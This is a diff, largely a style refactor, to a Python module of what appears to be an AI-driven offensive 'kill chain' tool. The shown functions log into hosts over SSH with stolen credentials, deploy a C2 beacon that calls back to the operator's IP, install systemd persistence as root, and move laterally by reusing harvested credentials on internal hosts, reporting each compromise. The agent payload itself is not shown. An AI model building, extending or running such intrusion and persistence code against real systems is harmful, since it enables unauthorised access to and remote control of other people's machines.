@@ -5,11 +5,8 @@ Stage 7: Lateral movement and C2 beacon deployment.
 
 import os
 import re
-import time
 import socket
-import shutil
-import subprocess
-import concurrent.futures
+import time
 
 try:
     import paramiko
@@ -17,11 +14,13 @@ except ImportError:
     paramiko = None
 
 try:
-    from config import CFG, find_wordlist, find_all_wordlists
+    from config import CFG, find_all_wordlists, find_wordlist
 except ImportError:
     CFG = {}
     def find_wordlist(cat): return ""
     def find_all_wordlists(cat): return []
+
+from typing import Optional
 
 from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec
 
@@ -36,9 +35,7 @@ C_MAGENTA = "\033[95m"
 C_RESET  = "\033[0m"
 
 
-# ═══════════════════════════════════════════════
 # PARAMIKO SSH HELPERS (shared across stages)
-# ═══════════════════════════════════════════════
 
 
 def _get_our_ip() -> str:
@@ -49,13 +46,11 @@ def _get_our_ip() -> str:
         ip = s.getsockname()[0]
         s.close()
         return ip
-    except Exception as e:
+    except Exception:
         return ""
 
 
-# ═══════════════════════════════════════════════
 # C2 BEACON DEPLOYMENT
-# ═══════════════════════════════════════════════
 
 def deploy_c2_beacon(host: str, user: str, password: str, port: int = 22) -> str:
     """
@@ -81,7 +76,7 @@ def deploy_c2_beacon(host: str, user: str, password: str, port: int = 22) -> str
             if not os.path.isfile(agent_path):
                 return output + f"[!] Local agent payload not found at {agent_path}\n"
 
-        with open(agent_path, "r") as f:
+        with open(agent_path) as f:
             agent_code = f.read()
 
         # Configure agent to point back to our IP
@@ -116,9 +111,19 @@ def deploy_c2_beacon(host: str, user: str, password: str, port: int = 22) -> str
         if is_root:
             print(f"    {C_CYAN}[*] Establishing systemd persistence for beacon...{C_RESET}")
             try:
-                from modules.persistence.systemd import SystemdPersistence
-                plugin = SystemdPersistence()
-                res = plugin.run(target=host, ssh_client=client, payload_path=f"python3 {target_path}")
+                from core.plugins.base import PluginContext
+                from core.plugins.loader import PluginManager
+
+                res = PluginManager("modules/").execute(
+                    "systemd",
+                    context=PluginContext(target=host),
+                    target=host,
+                    username=user,
+                    password=password,
+                    port=port,
+                    payload_path=f"python3 {target_path}",
+                    timeout=30,
+                )
                 res_success = getattr(res, "success", False) or (isinstance(res, dict) and res.get("status") == "success")
                 res_data = getattr(res, "data", None) or (res.get("data", {}) if isinstance(res, dict) else {})
                 res_error = getattr(res, "error", "") or (res.get("error", "") if isinstance(res, dict) else "")
@@ -143,7 +148,7 @@ def deploy_c2_beacon(host: str, user: str, password: str, port: int = 22) -> str
         output += "\nAI: C2 Beacon successfully deployed. Agent should register with C2 server shortly.\n"
 
     except Exception as e:
-        output += f"[-] Beacon deployment failed: {str(e)}\n"
+        output += f"[-] Beacon deployment failed: {e!s}\n"
         
     finally:
         client.close()
@@ -151,12 +156,10 @@ def deploy_c2_beacon(host: str, user: str, password: str, port: int = 22) -> str
     return output
 
 
-# ═══════════════════════════════════════════════
 # STAGE 5: LATERAL MOVEMENT (paramiko-based)
-# ═══════════════════════════════════════════════
 
 def lateral_move(host: str, user: str, password: str, port: int = 22,
-                 extra_creds: list = None) -> str:
+                 extra_creds: Optional[list] = None) -> str:
     """
     Lateral movement via paramiko.
     1. SSH into compromised host
@@ -291,7 +294,7 @@ def lateral_move(host: str, user: str, password: str, port: int = 22,
                     try:
                         # Use paramiko through the pivot
                         # First try direct connection from our machine
-                        pivot_client, pivot_err = _ssh_connect(
+                        pivot_client, _pivot_err = _ssh_connect(
                             target_ip, cred["user"], cred["password"], timeout=8
                         )
                         if pivot_client:
@@ -307,7 +310,7 @@ def lateral_move(host: str, user: str, password: str, port: int = 22,
                             output += f"        {pivot_whoami}\n"
                             print(f"    {C_GREEN}[+] COMPROMISED: {cred['user']}@{target_ip}{C_RESET}")
                             break  # Move to next host
-                    except Exception as e:
+                    except Exception:
                         continue
 
                     time.sleep(0.5)  # Avoid rate limiting on internal hosts
@@ -329,9 +332,3 @@ def lateral_move(host: str, user: str, password: str, port: int = 22,
         client.close()
 
     return output
-
-
-# ═══════════════════════════════════════════════
-# STAGE 6: DATA EXFILTRATION
-# ═══════════════════════════════════════════════
-
